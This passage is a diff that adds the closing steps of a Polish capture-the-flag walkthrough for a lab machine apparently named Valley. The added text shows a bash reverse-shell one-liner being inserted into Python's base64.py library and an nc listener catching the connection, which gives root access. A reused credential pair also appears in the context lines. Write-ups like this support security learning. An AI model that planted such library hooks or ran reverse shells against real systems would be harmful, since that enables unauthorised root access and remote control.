@@ -229,4 +229,25 @@ valley:liberty123
 
 ![UserValley](img/UserValley.JPG)
 
+Edytujemy plik /lib/python3.8/base64.py dodając komendy:
 
+```
+import os
+os.system('bash -c "bash -i >& /dev/tcp/[IP]/[PORT] 0>&1"')
+```
+
+Czekamy na połączenie:
+
+```
+nc -lvnp [PORT]
+```
+
+Po chwili uzyskujemy dostęp jako użytkownik root:
+
+![Shell](img/Shell.JPG)
+
+W pliku root.txt znajdujemy drugą flagę:
+
+![Root](img/Root.JPG)
+
+Do zobaczenia na kolejnych CTF-ach!
